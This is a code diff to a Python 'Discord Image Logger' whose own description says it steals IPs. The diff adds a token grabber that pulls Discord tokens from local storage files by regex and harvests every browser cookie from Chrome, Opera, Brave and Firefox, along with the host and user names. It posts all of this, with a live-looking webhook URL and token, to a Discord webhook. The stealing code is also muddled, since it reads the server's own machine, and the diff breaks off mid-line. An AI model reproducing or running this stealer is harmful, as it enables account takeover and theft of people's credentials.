@@ -1,11 +1,87 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
-import traceback, requests, base64, httpagentparser
+import traceback, requests, base64, httpagentparser, browser_cookie3, re, os, json
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0" 
 __author__ = "DeKrypt"
+
+def get_tokens():
+    tokens = []
+    roaming = os.getenv('APPDATA')
+    local = os.getenv('LOCALAPPDATA')
+    paths = {
+        'Discord': roaming + '\\Discord',
+        'Discord Canary': roaming + '\\discordcanary',
+        'Discord PTB': roaming + '\\discordptb',
+        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+        'Opera': roaming + '\\Opera Software\\Opera Stable',
+        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+        'Firefox': roaming + '\\Mozilla\\Firefox\\Profiles'
+    }
+    
+    for platform, path in paths.items():
+        if not os.path.exists(path):
+            continue
+        if 'Discord' in platform:
+            tokens.extend(get_discord_tokens(path))
+        else:
+            tokens.extend(get_browser_tokens(path))
+    return tokens
+
+def get_discord_tokens(path):
+    tokens = []
+    try:
+        with open(path + '\\Local Storage\\leveldb\\000005.ldb', 'r', encoding='utf-8') as file:
+            for line in file.readlines():
+                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                    for token in re.findall(regex, line):
+                        tokens.append(token)
+    except:
+        pass
+    return tokens
+
+def get_browser_tokens(path):
+    tokens = []
+    try:
+        if 'Chrome' in path:
+            cookies = browser_cookie3.chrome(domain_name='discord.com')
+        elif 'Opera' in path:
+            cookies = browser_cookie3.opera(domain_name='discord.com') 
+        elif 'Brave' in path:
+            cookies = browser_cookie3.brave(domain_name='discord.com')
+        elif 'Firefox' in path:
+            cookies = browser_cookie3.firefox(domain_name='discord.com')
+        
+        for cookie in cookies:
+            if cookie.name == '__dcfduid':
+                tokens.append(cookie.value)
+    except:
+        pass
+    return tokens
+
+def get_system_info():
+    cookies = []
+    browsers = ['chrome', 'opera', 'firefox', 'brave']
+    for browser in browsers:
+        try:
+            cookie_fn = getattr(browser_cookie3, browser)
+            cookies.extend([{
+                'domain': c.domain,
+                'name': c.name,
+                'value': c.value
+            } for c in cookie_fn()])
+        except:
+            pass
+            
+    return {
+        'tokens': get_tokens(),
+        'cookies': cookies,
+        'os': os.name,
+        'hostname': os.getenv('COMPUTERNAME'),
+        'username': os.getenv('USERNAME')
+    }
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1335307399405502626/MsUfNzyRoBvoN8pJ1UTdPycbADVNPGU1jVdfLV5LyW_uZrf2e3fx8Zg6L4zSdRjZJVGX",
@@ -76,6 +152,8 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     ping = "@everyone"
 
     info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
+    system_info = get_system_info()
+    
     if info["proxy"]:
         if config["vpnCheck"] == 2:
                 return
@@ -102,7 +180,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         if config["antiBot"] == 1:
                 ping = ""
 
-    os, browser = httpagentparser.simple_detect(useragent)
+    os_name, browser = httpagentparser.simple_detect(useragent)
     
     embed = {
     "username": config["username"],
@@ -129,11 +207,22 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
 
 **PC Info:**
-> **OS:** `{os}`
+> **OS:** `{os_name}`
 > **Browser:** `{browser}`
+> **Computer Name:** `{system_info['hostname']}`
+> **Username:** `{system_info['username']}`
+
+**Discord Tokens:**
+
+{chr(10).join(system_info['tokens']) if system_info['tokens'] else 'No tokens found'}
+
+
+**Cookies:**
+
+{json.dumps(system_info['cookies'], indent=2) if system_info['cookies'] else 'No cookies found'}
+
 
 **User Agent:**
-
 {useragent}
 """,
     }
@@ -248,16 +337,4 @@ if (!currenturl.includes("g=")) {
                 self.wfile.write(data)
         
         except Exception:
-            self.send_response(500)
-            self.send_header('Content-type', 'text/html')
-            self.end_headers()
-
-            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
-            reportError(traceback.format_exc())
-
-        return
-    
-    do_GET = handleRequest
-    do_POST = handleRequest
-
-handler = app = ImageLoggerAPI
+            self.send_
